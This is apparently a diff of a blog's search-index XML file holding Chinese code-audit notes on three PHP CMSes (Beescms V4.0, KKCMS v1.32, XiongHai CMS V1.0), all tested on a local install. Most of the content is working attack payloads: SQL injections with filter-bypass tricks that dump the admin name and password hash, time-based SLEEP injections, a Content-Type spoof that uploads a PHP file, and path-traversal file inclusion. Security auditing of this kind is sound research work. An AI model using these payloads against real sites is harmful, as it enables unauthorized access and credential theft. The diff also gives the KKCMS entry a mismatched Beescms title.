@@ -4,39 +4,75 @@
   
     
     <entry>
-      <title></title>
-      <link href="/2022/08/12/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-      <url>/2022/08/12/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+      <title>Beescms V4.0审计</title>
+      <link href="/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <url>/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
       
         <content type="html"><![CDATA[<h1 id="beescms"><a href="#beescms" class="headerlink" title="beescms"></a>beescms</h1><h2 id="前台管理登录界面注入"><a href="#前台管理登录界面注入" class="headerlink" title="前台管理登录界面注入"></a>前台管理登录界面注入</h2><p><a href="http://127.0.0.1/beescms/admin/login.php">http://127.0.0.1/beescms/admin/login.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>()默认仅编码双引号</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="variable">$rel</span>=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;mysql&#x27;</span>]-&gt;<span class="title function_ invoke__">fetch_asc</span>(<span class="string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span>.DB_PRE.<span class="string">&quot;admin where admin_name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; limit 0,1&quot;</span>);</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;and extractvalue(1,concat(0x7e,select database(),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;利用双写+空格绕过过滤<br>&#x2F;&#x2F;爆破表名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect table_name fr from om information_schema.tables wh where ere table_schema like &#x27;</span>beescms<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破列名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect column_name fr from om information_schema.columns wh where ere table_name like &#x27;</span>bees_admin<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破admin账户名:admin</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect admin_name fr from om beescms.bees_admin limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;结合substr全部爆破密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,substr((selselectect admin_password fr from om beescms.bees_admin limit 0,1),3,32),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;21232f297a57a5a743894a0e4a801fc3很明显的md5函数处理：admin</p><h2 id="后台文件上传1"><a href="#后台文件上传1" class="headerlink" title="后台文件上传1"></a>后台文件上传1</h2><p>mime类型绕过<br><a href="http://127.0.0.1/beescms/admin/admin_pic_upload.php">http://127.0.0.1/beescms/admin/admin_pic_upload.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value_arr</span>=<span class="title function_ invoke__">up_img</span>(<span class="variable">$pic_info</span>,<span class="variable">$is_up_size</span>,<span class="keyword">array</span>(<span class="string">&#x27;image/gif&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/bmp&#x27;</span>,<span class="string">&#x27;image/pjpeg&#x27;</span>,<span class="string">&#x27;image/x-png&#x27;</span>),<span class="variable">$up_is_thumb</span>,<span class="variable">$up_thumb_width</span>,<span class="variable">$up_thumb_height</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_name_alt</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">up_img</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$size</span>,<span class="variable">$type</span>,<span class="variable">$thumb</span>=<span class="number">0</span>,<span class="variable">$thumb_width</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$thumb_height</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_alt</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$file_type</span>=<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_type</span>),<span class="variable">$type</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">msg</span>(<span class="string">&#x27;上传图片格式不正确&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只对Content-Type： 进行了对比<br>所以修改Content-Type： 即可进行文件上传绕过<br>Content-Disposition: form-data; name&#x3D;”up[]”; filename&#x3D;”1.php”<br>Content-Type: image&#x2F;png</p><h2 id="后台文件上传2"><a href="#后台文件上传2" class="headerlink" title="后台文件上传2"></a>后台文件上传2</h2><p>同样是mime类型绕过<br>up_img()函数<br><a href="http://127.0.0.1/beescms/admin/upload.php">http://127.0.0.1/beescms/admin/upload.php</a></p><h2 id="后台文件上传3"><a href="#后台文件上传3" class="headerlink" title="后台文件上传3"></a>后台文件上传3</h2><p><a href="http://127.0.0.1/beescms/admin/admin_sys.php">http://127.0.0.1/beescms/admin/admin_sys.php</a><br>修改允许上传文件类型<br>添加一个php类型<br>然后<br><a href="http://127.0.0.1/beescms/admin/admin_file_upload.php">http://127.0.0.1/beescms/admin/admin_file_upload.php</a><br>即可上传php文件</p>]]></content>
       
       
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
       
     </entry>
     
     
     
     <entry>
-      <title></title>
+      <title>Beescms V4.0审计</title>
       <link href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/"/>
       <url>/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/</url>
       
-        <content type="html"><![CDATA[<p>KKCMS v1.32审计</p><p>前台注入1<br><a href="http://127.0.0.1/kkcms/bplay.php?play=a">http://127.0.0.1:80/kkcms/bplay.php?play=a</a> AND (SELECT 6254 FROM (SELECT(SLEEP(5)))hZmf)</p><p>前台注入2<br><a href="http://127.0.0.1/kkcms/ucenter/active.php?verify=a&#39;">http://127.0.0.1:80/kkcms/ucenter/active.php?verify=a&#39;</a> AND (SELECT 7219 FROM (SELECT(SLEEP(5)))VMtB) AND ‘qLKJ’&#x3D;’qLKJ</p><p>未授权添加<br><a href="http://127.0.0.1/kkcms/ucenter/cms_user_add.php">http://127.0.0.1/kkcms/ucenter/cms_user_add.php</a></p><p>后台注入<br><a href="http://127.0.0.1/kkcms/admin/cms_ad_edit.php?id=1">http://127.0.0.1:80/kkcms/admin/cms_ad_edit.php?id=1</a> AND (SELECT 3894 FROM (SELECT(SLEEP(5)))RJzc)</p><p>这套一堆都是重复的注入</p><p>没意思 不写了</p>]]></content>
+        <content type="html"><![CDATA[<p>#KKCMS v1.32审计</p><p>##前台注入1<br><a href="http://127.0.0.1/kkcms/bplay.php?play=a">http://127.0.0.1:80/kkcms/bplay.php?play=a</a> AND (SELECT 6254 FROM (SELECT(SLEEP(5)))hZmf)</p><p>##前台注入2<br><a href="http://127.0.0.1/kkcms/ucenter/active.php?verify=a&#39;">http://127.0.0.1:80/kkcms/ucenter/active.php?verify=a&#39;</a> AND (SELECT 7219 FROM (SELECT(SLEEP(5)))VMtB) AND ‘qLKJ’&#x3D;’qLKJ</p><p>##未授权添加用户<br><a href="http://127.0.0.1/kkcms/ucenter/cms_user_add.php">http://127.0.0.1/kkcms/ucenter/cms_user_add.php</a></p><p>##后台注入<br><a href="http://127.0.0.1/kkcms/admin/cms_ad_edit.php?id=1">http://127.0.0.1:80/kkcms/admin/cms_ad_edit.php?id=1</a> AND (SELECT 3894 FROM (SELECT(SLEEP(5)))RJzc)</p><p>这套一堆都是重复的注入</p><p>没意思 不写了</p>]]></content>
       
       
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
       
     </entry>
     
     
     
     <entry>
-      <title></title>
-      <link href="/2022/08/11/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/"/>
-      <url>/2022/08/11/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/</url>
+      <title>熊海CMS V1.0审计</title>
+      <link href="/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/"/>
+      <url>/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/</url>
       
-        <content type="html"><![CDATA[<h1 id="熊海CMS-V1-0审计"><a href="#熊海CMS-V1-0审计" class="headerlink" title="熊海CMS V1.0审计"></a>熊海CMS V1.0审计</h1><p>vscode+phpsuty</p><p>熊海CMS<br><a href="http://127.0.0.1/xhcms/admin/?r=login">http://127.0.0.1/xhcms/admin/?r=login</a><br>SQL注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin*&amp;password=<span class="number">123456</span>&amp;login=yes</span><br></pre></td></tr></table></figure><p>前台文件包含<br><a href="http://127.0.0.1/xhcms/index.php?r=../../phpinfo">http://127.0.0.1/xhcms/index.php?r=../../phpinfo</a><br>$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br>$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘.$action.’.php’); &#x2F;&#x2F;载入相应文件</p><p>后台文件包含<br><a href="http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo">http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo</a><br>$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br>$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘.$action.’.php’); &#x2F;&#x2F;载入相应文件</p><p>前台注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=content&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=software&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p>addslashes 防SQL注入 转义单引号 ‘  &#39;<br>$query &#x3D; “UPDATE content SET hit &#x3D; hit+1 WHERE id&#x3D;$id”; &#x2F;&#x2F;这里没用到单引号闭合 所以存在SQL注入</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="熊海CMS-V1-0审计"><a href="#熊海CMS-V1-0审计" class="headerlink" title="熊海CMS V1.0审计"></a>熊海CMS V1.0审计</h1><p>vscode+phpsuty</p><p>##SQL注入<br><a href="http://127.0.0.1/xhcms/admin/?r=login">http://127.0.0.1/xhcms/admin/?r=login</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin*&amp;password=<span class="number">123456</span>&amp;login=yes</span><br></pre></td></tr></table></figure><p>##前台文件包含<br><a href="http://127.0.0.1/xhcms/index.php?r=../../phpinfo">http://127.0.0.1/xhcms/index.php?r=../../phpinfo</a><br>$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br>$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘.$action.’.php’); &#x2F;&#x2F;载入相应文件</p><p>##后台文件包含<br><a href="http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo">http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo</a><br>$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br>$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘.$action.’.php’); &#x2F;&#x2F;载入相应文件</p><p>##前台注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=content&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=software&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p>addslashes 防SQL注入 转义单引号 ‘  &#39;<br>$query &#x3D; “UPDATE content SET hit &#x3D; hit+1 WHERE id&#x3D;$id”; &#x2F;&#x2F;这里没用到单引号闭合 所以存在SQL注入</p>]]></content>
       
       
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
       
     </entry>
     
